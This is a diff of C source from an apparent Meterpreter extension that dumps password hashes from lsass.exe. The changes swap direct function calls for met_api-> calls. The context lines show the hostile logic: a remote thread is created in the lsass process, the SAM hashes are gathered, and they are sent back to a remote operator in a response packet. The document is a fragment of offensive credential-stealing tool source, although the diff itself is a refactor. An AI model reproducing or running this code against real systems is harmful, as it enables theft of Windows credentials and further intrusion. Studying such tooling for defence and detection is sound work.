@@ -3,6 +3,7 @@
  * @brief Functionality for dumping password hashes from lsass.exe.
  */
 #include "precomp.h"
+#include "common_metapi.h"
 #include <stdio.h>
 #include <windows.h>
 #include <psapi.h>
@@ -776,7 +777,7 @@ DWORD __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresul
 		sBytesWritten = 0;
 
 		/* start the remote thread */
-		if ((hThreadHandle = create_remote_thread(hLsassHandle, 0, pvFunctionMemory, pvParameterMemory, 0, NULL)) == NULL)
+		if ((hThreadHandle = met_api->thread.create_remote(hLsassHandle, 0, pvFunctionMemory, pvParameterMemory, 0, NULL)) == NULL)
 		{
 			dwError = GetLastError();
 			dprintf("[PASSWD] Failed to create remote thread %u (%x)", dwError, dwError);
@@ -970,7 +971,7 @@ DWORD __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresul
  */
 DWORD request_passwd_get_sam_hashes(Remote *remote, Packet *packet)
 {
-	Packet *response = packet_create_response(packet);
+	Packet *response = met_api->packet.create_response(packet);
 	DWORD res = ERROR_SUCCESS;
 	char *hashes = NULL;
 
@@ -983,11 +984,11 @@ DWORD request_passwd_get_sam_hashes(Remote *remote, Packet *packet)
 			break;
 		}
 
-		packet_add_tlv_string(response, TLV_TYPE_SAM_HASHES, hashes);
+		met_api->packet.add_tlv_string(response, TLV_TYPE_SAM_HASHES, hashes);
 
 	} while (0);
 
-	packet_transmit_response(res, remote, response);
+	met_api->packet.transmit_response(res, remote, response);
 
 	if (hashes)
 	{
